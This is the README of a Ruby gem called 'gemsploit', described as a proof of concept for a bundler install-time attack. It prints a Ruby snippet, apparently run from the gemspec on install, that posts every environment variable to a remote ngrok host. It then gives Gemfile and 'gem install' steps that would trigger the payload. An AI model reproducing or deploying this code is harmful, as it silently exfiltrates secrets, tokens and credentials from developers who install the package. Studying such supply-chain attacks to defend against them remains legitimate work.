# Gemsploit

Proof of concept for ruby bundler exploit. When this gem is installed, it posts all of your ENV files to my server.

## How it works

When a gem is installed, the code block in the `*.gemspec` file is executed. This gem contains a malicious payload to post all of your ENV variables to a remote server when the gem is installed (`$ bundle` or `$ gem install gemsploit`)

```ruby
  require "net/http"
  require "uri"

  uri = URI.parse("http://10cbe90f.ngrok.io/graphql")
  response = Net::HTTP.post_form(uri, ENV.to_h)
```

## Installation

Add this line to your application's Gemfile:

```ruby
gem 'gemsploit'
```

## Usage

Execute:

    $ bundle

Or install it yourself as:

    $ gem install gemsploit